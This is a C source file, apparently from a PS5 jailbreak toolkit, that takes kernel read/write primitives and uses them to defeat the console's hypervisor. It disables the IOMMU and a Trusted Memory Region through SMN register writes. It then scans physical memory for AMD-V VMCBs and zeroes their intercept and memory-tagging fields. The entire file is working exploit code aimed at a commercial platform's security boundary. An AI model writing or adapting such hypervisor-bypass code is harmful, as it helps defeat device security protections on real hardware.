#include <string.h>
#include "../include/hv_bypass.h"
#include "../include/smn.h"
#include "../include/iommu.h"

static struct smn_ctx g_smn;

/* Adapter: bridge hv_bypass krw callbacks to smn_ctx callbacks */
static void smn_pw32_adapter(uint64_t addr, uint32_t val, void *arg)
{
    struct hv_bypass_ctx *ctx = (struct hv_bypass_ctx *)arg;
    ctx->write32(addr, val, ctx->krw_arg);
}

static uint32_t smn_pr32_adapter(uint64_t addr, void *arg)
{
    struct hv_bypass_ctx *ctx = (struct hv_bypass_ctx *)arg;
    return ctx->read32(addr, ctx->krw_arg);
}

int hv_bypass_init(struct hv_bypass_ctx *ctx, uint64_t dmap_base,
                   krw_write32_fn w32, krw_read32_fn r32,
                   krw_copyin_fn ci, krw_copyout_fn co,
                   void *krw_arg)
{
    ctx->dmap_base = dmap_base;
    ctx->write32 = w32;
    ctx->read32 = r32;
    ctx->copyin = ci;
    ctx->copyout = co;
    ctx->krw_arg = krw_arg;

    smn_init(&g_smn, dmap_base, smn_pw32_adapter, smn_pr32_adapter, ctx);
    return 0;
}

int hv_bypass_disable_iommu(struct hv_bypass_ctx *ctx)
{
    (void)ctx;
    return iommu_disable_all(&g_smn);
}

/*
 * Disable a TMR (Trusted Memory Region).
 *
 * TMRs protect carveout regions from x86 access. The MP4 media processor
 * carveout is typically at TMR index 20 (physical range 0x60000000-0x605F0000).
 *
 * Each TMR has a control register at TMR_SMN_BASE + index * 0x20.
 * Clearing bit 0 of the control register disables the TMR.
 *
 * NOTE: On FW >= 5.00, TMR registers are no longer directly writable
 * via SMN. This only works on FW 4.03 and below.
 */
int hv_bypass_disable_tmr(struct hv_bypass_ctx *ctx, uint32_t tmr_index)
{
    (void)ctx;
    uint32_t tmr_addr = TMR_SMN_BASE + tmr_index * 0x20 + TMR_CONTROL_OFF;
    uint32_t ctl = smn_read32(&g_smn, tmr_addr);

    if (!(ctl & 1))
        return 0; /* Already disabled */

    /* Clear enable bit */
    smn_write32(&g_smn, tmr_addr, ctl & ~1u);

    /* Verify */
    ctl = smn_read32(&g_smn, tmr_addr);
    if (ctl & 1)
        return -1; /* Failed to disable */

    return 0;
}

/*
 * Patch a VMCB (Virtual Machine Control Block) to disable HV intercepts.
 *
 * The PS5 hypervisor uses AMD-V (SVM) to control guest (kernel) execution.
 * Each vCPU has a VMCB that specifies what operations trigger a #VMEXIT.
 *
 * From prosperous pwn_mp4.lua, the key patches are:
 *   - Clear CR/DR intercept bits
 *   - Clear exception intercept bitmap
 *   - Clear miscellaneous intercept controls
 *   - Clear guest memory tagging (VMCB offset 0x414)
 *     This disables SME/SEV-like memory tagging that prevents
 *     the kernel from accessing certain physical memory regions.
 *
 * vmcb_pa: physical address of the VMCB (must be page-aligned)
 */
int hv_bypass_patch_vmcb(struct hv_bypass_ctx *ctx, uint64_t vmcb_pa)
{
    uint64_t vmcb_dmap = ctx->dmap_base + vmcb_pa;
    uint32_t zero32 = 0;

    /* Disable CR read/write intercepts */
    ctx->copyin(vmcb_dmap + VMCB_INTERCEPT_CR_OFF, &zero32, 4, ctx->krw_arg);

    /* Disable DR read/write intercepts */
    ctx->copyin(vmcb_dmap + VMCB_INTERCEPT_DR_OFF, &zero32, 4, ctx->krw_arg);

    /* Disable exception intercepts */
    ctx->copyin(vmcb_dmap + VMCB_INTERCEPT_EXC_OFF, &zero32, 4, ctx->krw_arg);

    /* Disable misc intercepts (INTR, NMI, SMI, INIT, VINTR, etc.) */
    ctx->copyin(vmcb_dmap + VMCB_INTERCEPT_MISC1_OFF, &zero32, 4, ctx->krw_arg);
    ctx->copyin(vmcb_dmap + VMCB_INTERCEPT_MISC2_OFF, &zero32, 4, ctx->krw_arg);

    /* Clear guest memory encryption/tagging */
    ctx->copyin(vmcb_dmap + VMCB_GUEST_TAG_OFF, &zero32, 4, ctx->krw_arg);

    /* Mark VMCB as dirty so the processor reloads all fields */
    ctx->copyin(vmcb_dmap + VMCB_VMCB_CLEAN_OFF, &zero32, 4, ctx->krw_arg);

    return 0;
}

/*
 * Scan for VMCBs in physical memory.
 *
 * VMCBs are page-aligned (4096 bytes) structures. We can identify them
 * by checking for the characteristic pattern:
 *   - Offset 0x058 (Guest ASID): should be non-zero (1-based)
 *   - Offset 0x408 (Nested CR3): should be page-aligned and non-zero
 *   - Offset 0x00C (Intercept misc1): should have known intercept bits set
 *
 * The hypervisor typically allocates VMCBs in a contiguous region.
 * On FW 4.03, there are typically 16 VMCBs (one per logical CPU).
 *
 * Search range: after the kernel and before the HV region.
 * This is a heuristic - adjust the scan range for your setup.
 */
int hv_bypass_find_vmcbs(struct hv_bypass_ctx *ctx,
                         uint64_t *vmcb_pas, int max_vmcbs)
{
    int found = 0;
    uint32_t buf[4];

    /*
     * Scan a range of physical memory where VMCBs are likely located.
     * On 4.03, the HV region is typically around 0x100000000+.
     * Scan in page-sized steps since VMCBs are page-aligned.
     *
     * The exact range depends on the console's memory layout.
     * A narrower range can be used if the HV base is known.
     */
    uint64_t scan_start = 0x100000000ULL;
    uint64_t scan_end   = 0x180000000ULL;

    for (uint64_t pa = scan_start; pa < scan_end && found < max_vmcbs; pa += 0x1000) {
        uint64_t dmap_addr = ctx->dmap_base + pa;

        /* Read intercept fields at the start of the candidate VMCB */
        ctx->copyout(buf, dmap_addr, sizeof(buf), ctx->krw_arg);

        /* Check for plausible intercept control values */
        uint32_t intercept_cr = buf[0];
        uint32_t intercept_dr = buf[1];
        uint32_t intercept_exc = buf[2];
        (void)buf[3]; /* intercept_misc1 — read but not used for filtering */

        /* VMCBs typically intercept at least some CR accesses and exceptions */
        if (intercept_cr == 0 && intercept_dr == 0)
            continue;
        if (intercept_exc == 0)
            continue;

        /* Check Guest ASID (must be non-zero) */
        uint32_t guest_asid;
        ctx->copyout(&guest_asid, dmap_addr + VMCB_GUEST_ASID_OFF, 4, ctx->krw_arg);
        if (guest_asid == 0 || guest_asid > 256)
            continue;

        /* Check nested CR3 (must be page-aligned and non-zero) */
        uint64_t ncr3;
        ctx->copyout(&ncr3, dmap_addr + VMCB_N_CR3_OFF, 8, ctx->krw_arg);
        if (ncr3 == 0 || (ncr3 & 0xFFF) != 0)
            continue;

        /* Looks like a VMCB */
        vmcb_pas[found++] = pa;
    }

    return found;
}

int hv_bypass_run(struct hv_bypass_ctx *ctx)
{
    int ret;

    /* Step 1: Disable IOMMU */
    ret = hv_bypass_disable_iommu(ctx);
    if (ret != 0)
        return -1;

    /* Step 2: Disable TMR for MP4 carveout (index 20) */
    ret = hv_bypass_disable_tmr(ctx, 20);
    if (ret != 0)
        return -2;

    /* Step 3: Find and patch VMCBs */
    uint64_t vmcb_pas[16];
    int n_vmcbs = hv_bypass_find_vmcbs(ctx, vmcb_pas, 16);
    if (n_vmcbs == 0)
        return -3;

    for (int i = 0; i < n_vmcbs; i++) {
        ret = hv_bypass_patch_vmcb(ctx, vmcb_pas[i]);
        if (ret != 0)
            return -4;
    }

    return 0;
}
